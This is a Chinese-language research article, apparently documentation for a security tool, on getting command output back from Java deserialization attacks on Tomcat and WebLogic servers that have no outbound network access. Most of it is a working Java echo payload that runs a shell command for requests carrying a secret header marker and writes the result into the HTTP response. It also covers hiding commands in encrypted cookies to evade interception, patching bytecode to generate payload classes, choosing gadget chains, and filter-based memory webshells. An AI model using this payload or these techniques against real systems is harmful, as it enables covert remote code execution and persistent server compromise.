---
sidebar_position: 2
---

# Java 反序列化回显链研究

回显方案选择

实战中反序列化漏洞利用时，经常会遇到不出网的情况，命令执行成功，但拿不到执行结果，也不能回连

这种情况可能是内网主机网络配置，禁用了tcp/dns/icmp等协议的出网，再通过nginx将web服务代理出来，或类似方式。内网主机不通公网，但公网可以通过web端口和内网主机通信

执行结果的传出可以通过下面几种方式

1. 反弹shell，dnslog回显（需要出网）
2. 写脚本，通过延时，类似布尔盲注的方式得到执行结果（效率太低，不太现实）
3. 将执行结果写入到web目录下（要先获取到web路径）
4. 通过执行java代码，将命令执行结果直接写到web请求的响应包中（需要代码执行）

| / | 反弹shell，dnslog回显  | 通过延时爆破回显的脚本  | 写到web目录  | 将回显内容写到响应包
|  ----  | ----  | ----  | ----  | ----  |
| 优点  | 简单方便 | 应用范围广 | 简单方便 | 稳定高效
| 缺点  | 需要机器出网 | 需要机器出网 | 需要知道web路径 | 需要可以代码执行

因为web端口可以和外界通讯（收到请求包，返回响应包），所以最优方案就是通过请求包发送命令，响应包回传执行结果

## 通过java代码执行回显

<div align="center">
    <img src="/img/products/yakit/research-echo.svg" />
</div>

## 生成回显class模板

因为不同web框架，获取到web请求的方式不同，所以，需要针对不同web框架，分别制作一套模板

也可以把多套模板合并，通过加载的类判断当前环境。代码编写时，最好通过反射加载class，来适应更多环境。

代码如下，合并了tomcat和weblogic框架的paylaod

```java
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

public class MultiEchoTempl {
    static String cmd ="whoami";
    public MultiEchoTempl(){
        start();
    }
    static {
        start();
    }
    private static void start(){
        try{
            Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            tomcat();
            return;
        } catch (Exception ignored){

        }
        try {
            Class.forName("weblogic.work.ExecuteThread");
            WeblogicEchoTemplate();
            return;
        } catch (Exception ignored){

        }
    }
    private static void tomcat() {
        try{
            Thread[] var5 = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");
            for (Thread var7 : var5) {
                if (var7 != null) {
                    String var3 = var7.getName();
                    if (!var3.contains("exec") && var3.contains("http")) {
                        Object var1 = getFV(var7, "target");
                        if (var1 instanceof Runnable) {
                            try {
                                var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
                            } catch (Exception var13) {
                                continue;
                            }
                            List var9 = (List) getFV(var1, "processors");
                            for (Object var11 : var9) {
                                var1 = getFV(var11, "req");
                                Object var2 = var1.getClass().getMethod("getResponse").invoke(var1);
                                String var15 = (String) var1.getClass().getMethod("getHeader", String.class).invoke(var1, "Accept-Language");
                                if (var15 != null && var15.equals("zh-CN,zh;q=1.9")) {
                                    var2.getClass().getMethod("setStatus", Integer.TYPE).invoke(var2, new Integer(200));
                                    String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                                    writeBody(var2, (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
                                    return;
                                }
                            }
                        }
                    }
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static void writeBody(Object var0, byte[] var1) throws Exception {
        Object var2;
        Class var3;
        try {
            var3 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            var2 = var3.newInstance();
            var3.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var2, var1, new Integer(0), new Integer(var1.length));
            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
        } catch (NoSuchMethodException var5) {
            var3 = Class.forName("java.nio.ByteBuffer");
            var2 = var3.getDeclaredMethod("wrap", byte[].class).invoke(var3, var1);
            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
        }

    }

    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public static void WeblogicEchoTemplate(){
        try{
            Object adapter = Class.forName("weblogic.work.ExecuteThread").getDeclaredMethod("getCurrentWork").invoke(Thread.currentThread());
            Object res;
            if(!adapter.getClass().getName().endsWith("ServletRequestImpl")){
                Field field = adapter.getClass().getDeclaredField("connectionHandler");
                field.setAccessible(true);
                Object obj = field.get(adapter);
                adapter = obj.getClass().getMethod("getServletRequest").invoke(obj);
            }
            String var15 = (String) adapter.getClass().getMethod("getHeader", String.class).invoke(adapter, "Accept-Language");
            if (var15 != null && var15.equals("zh-CN,zh;q=1.9")) {
                String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                res = adapter.getClass().getMethod("getResponse").invoke(adapter);
                Object sin = Class.forName("weblogic.xml.util.StringInputStream").getConstructor(String.class).newInstance(result);
                Object out = res.getClass().getDeclaredMethod("getServletOutputStream").invoke(res);
                out.getClass().getDeclaredMethod("writeStream",Class.forName("java.io.InputStream")).invoke(out,sin);
                out.getClass().getDeclaredMethod("flush").invoke(out);
                Object w = res.getClass().getDeclaredMethod("getWriter").invoke(res);
                w.getClass().getDeclaredMethod("write",String.class).invoke(w,"");
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```
### 区分命令请求和正常业务请求
因为当前代码执行的方式是通过类的静态代码块，不能直接拿到当前的Request，所以只能通过上下文，获取所有web请求，遍历，筛选出“恶意请求”

**怎么找出“恶意请求”？**

常规的做法是，添加header，例如cmd: aaa，来标记“恶意请求”（但是这个标记需要隐蔽些，避免明显的流量特征）

其实也可以用当前请求的请求体，作为标记。可以在构造payload时，加入一些标志符，例如在恶意类中添加一个随机字符串，则生成的class中就会包含这个字符串，在代码执行时，获取到payload，检查这个字符串是否存在。但这种方式太不灵活了，payload可能是base64的字节码，或hex的字节码，代码执行时需要检查的就需要是base64的随机字符串或hex的随机字符串

**伪代码**

```go
threads = Thread.getThreads()
var thread
// 找出处理http请求的线程
foreach t : threads{
    if t.getName().content("http"){
        thread = t
        break
    }
}

reqs = t.getRequests()
// 找出hedaer中含有标记的请求，在其返回包内写入命令执行结果
foreach req : reqs{
    if req.getHeaders().get("cmd") != null{
        req.getResponse().setBody(eval("whoami"))
        break
    }
}
```

## 动态生成字节码
### 修改命令
恶意类一般是从header中拿命令，可以将命令写在cookie中，做一些加密，防止被拦截

除此之外，也可以将命令直接硬编码在恶意类中，那就涉及到一个问题，如何动态生成字节码（不然每次执行命令前都要先编译）

分别编译命令为whoami和id的代码，对比生成的字节码如图

![](/img/products/yakit/research-whoami.png)

图中可以发现，区别除了两个字符串，还有前面的一个字符，分别表示字符串长度

实际上字符串前的两个字符都是用来表示字符串长度的，所以java字符串最大长度就是ffffh，即65535
通过python脚本实现修改字节码中的命令

![](/img/products/yakit/research-python.png)

### 修改类名
因为类加载利用，都是通过静态代码块执行代码。由于同一个类的静态代码块只会执行一次，所以如果想多次执行代码，就需要每次用不同的类名去加载（类很大时使用javaassist就会很麻烦），所以需要动态修改class文件的类名


同样的套路，一份代码，改个类名，编译成class文件，010Editor对比两份文件

例如，类名`TomcatEchoTemplate`

发现三处不同

这里好像是本地变量表，`TomcatEchoTemplate` 前有个L，后有个;。字符串前的0014是`LTomcatEchoTemplate;`的长度

![](/img/products/yakit/research-tomcatEchoTemplate-1.png)

这里是文件名，字符串前的0017是“`TomcatEchoTemplate.java`”的长度

![](/img/products/yakit/research-tomcatEchoTemplate-2.png)

这里的0012是`TomcatEchoTemplate`的长度

![](/img/products/yakit/research-tomcatEchoTemplate-3.png)

代码实现就只需要修改class中三处类名和类名前的字符串长度

## 选择利用链
如果想利用框架，中间件回显，需要代码执行，所以需要类加载，可以用于一些任意类加载的漏洞，例如jndi注入，利用reference对象加载远程class

如果是反序列漏洞，想代码执行，就需要`sink`是`TemplatesImpl`。yso的cc链sink是`TemplatesImpl`有两种方式，一个是通过`InvokerTransformer.transform()->TemplatesImpl.newTransformer()`，一个是`InstantiateTransformer.transform()->TrAXFilter. TrAXFilter()->TemplatesImpl.newTransformer()`，实际上所有cc链都可以途经这两条路，所以所有链稍加修改都可以通过`TemplatesImpl`代码执行

引用一张白白白师傅总结的图

![](/img/products/yakit/research-summary.png)

所以利用链的选择，就根据目标环境选择吧


## 内存马
内存马也是一种解决方案

以filter内存马为例，就是通过代码执行，动态注册filter，将一个函数，作为filter，当请求满足条件时，就调用这个函数处理请求

大概流程如下

从当前线程上下文中获取到`addFilterDef`方法，将自定义Filter添加进去

当前类继承Filter接口，实现doFilter方法，就可以将自己作为filter了

如图

![](/img/products/yakit/research-memoryhorse-1.png)

![](/img/products/yakit/research-memoryhorse-2.png)

## 总结
payload形式的命令执行，更适合于漏洞检测，如果多次代码执行，每一次的类加载都会存到jvm的永久区里，特别特别多的话可能会导致占满jvm内存。内存马适合用于做webshell

手动修改字节码的好处在于可以脱离jdk动态生成class。可以用于漏洞检测工具中，无需依赖java环境。

相反在 Java 环境中，由于本身需要遵循 Java 的规则，让 “动态类名” 等特性变的不那么容易，恶意类名按限定名只加载一次是一个阻碍工程化漏洞检测的实际问题。

## 测试环境
Docker 镜像 `vulhub/tomcat`，`vulhub/weblogic`

测试代码

![](/img/products/yakit/research-test-code.png)

本地用idea创建javaweb项目，测试代码如上，打包成war包，部署在`tomcat`和`weblogic`即可

测试结果如图

![](/img/products/yakit/research-test-result.png)